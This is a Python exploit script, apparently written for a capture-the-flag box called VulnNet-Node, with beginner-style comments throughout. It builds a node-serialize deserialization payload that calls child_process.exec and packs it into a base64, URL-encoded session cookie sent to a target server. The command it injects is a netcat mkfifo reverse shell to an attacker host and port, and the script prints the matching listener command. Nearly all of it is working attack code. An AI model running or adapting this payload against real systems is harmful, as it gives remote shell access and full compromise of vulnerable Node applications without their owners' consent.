#!/usr/bin/env python3
"""
VulnNet-Node — node-serialize RCE exploit
Reverse shell only
"""

import argparse      # For parsing command line arguments (like target, IP, port)
import base64        # For encoding data in base64 (like URL-safe encoding)
import json          # For creating JSON objects
import sys           # For system operations (exit, arguments)
import urllib.parse  # For URL encoding (making data safe for URLs)
import requests      # For making HTTP requests to the target

BANNER = r"""
 __   __    _ _       _   _      _     _   _           _
 \ \ / /  | | |     | \ | |    | |   | \ | |         | |
  \ V /   | | |_ _  |  \| | ___| |_  |  \| | ___   __| | ___
   > <    | | | | | | . ` |/ _ \ __| | . ` |/ _ \ / _` |/ _ \\
  / . \  _| | | |_| | |\  |  __/ |_  | |\  | (_) | (_| |  __/
 /_/ \_\(_)_|_|\__,_|_| \_|\___|\___|_| \_|\___/ \__,_|\___|
        node-serialize deserialization RCE
"""
# This is just a cool ASCII art logo that shows what the script does


def build_payload(cmd: str) -> str:
    """Build node-serialize IIFE RCE payload, return URL-encoded base64 cookie."""
    # Escape single quotes in cmd for JS string safety
    # If the command has single quotes, we need to escape them so JavaScript doesn't break
    cmd_escaped = cmd.replace("'", "\\'")

    # Create a JavaScript function that will run our command when the app deserializes it
    # node-serialize is a library that converts objects to strings and back
    # If it's not secured, we can inject malicious code
    iife = f"_$$ND_FUNC$$_function(){{require('child_process').exec('{cmd_escaped}')}}()"

    # Create a JSON object that looks like a normal user session
    # but contains our malicious "rce" field with the JavaScript code
    obj = {
        "username": "Guest",
        "isGuest": False,
        "encoding": "utf-8",
        "rce": iife,
    }

    # Convert the object to a JSON string
    raw = json.dumps(obj)

    # Encode the JSON as base64 (so it can be safely put in a cookie)
    b64 = base64.b64encode(raw.encode()).decode()

    # URL-encode the base64 string (so it's safe for URLs/cookies)
    return urllib.parse.quote(b64)


def send(target: str, cookie: str, verbose: bool = False) -> requests.Response:
    """Send the malicious cookie to the target server."""
    # Clean up the target URL (remove trailing slash if present)
    url = target.rstrip('/')

    # Set up the HTTP headers with our malicious session cookie
    headers = {"Cookie": f"session={cookie}"}

    # If verbose mode is on, show what we're doing
    if verbose:
        print(f"[*] Sending to: {url}")
        print(f"[*] Cookie: session={cookie}")

    # Send the HTTP GET request with our malicious cookie
    return requests.get(url, headers=headers, timeout=10)


def main():
    """Main function - the entry point of the script."""
    # Show the cool banner
    print(BANNER)

    # Set up command line argument parsing
    parser = argparse.ArgumentParser(
        description="VulnNet-Node node-serialize RCE exploit (reverse shell only)"
    )
    parser.add_argument("target", help="Target URL e.g. http://node:8080")
    parser.add_argument("lhost", help="Your IP address (where the reverse shell connects)")
    parser.add_argument("lport", help="Your port for reverse shell")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    # Parse the arguments provided by the user
    args = parser.parse_args()

    # Build the reverse shell command
    # This creates a named pipe (fifo) that allows bidirectional shell access
    # rm /tmp/f          - Remove any existing pipe
    # mkfifo /tmp/f      - Create a new named pipe
    # cat /tmp/f|sh -i   - Read from pipe and feed to shell
    # 2>&1|nc ... >/tmp/f - Send shell output back to the pipe via netcat
    cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f'

    # Tell the user what's happening
    print(f"[*] Reverse shell \u2192 {args.lhost}:{args.lport}")
    print(f"[!] Start listener: nc -lvnp {args.lport}")

    # Build the malicious payload (cookie)
    cookie = build_payload(cmd)

    # Send the payload to the target
    try:
        send(args.target, cookie, verbose=args.verbose)
    except requests.exceptions.ConnectionError:
        pass  # Connection error is okay - the shell might close the connection

    print("[*] Payload sent. Check your listener.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(0)
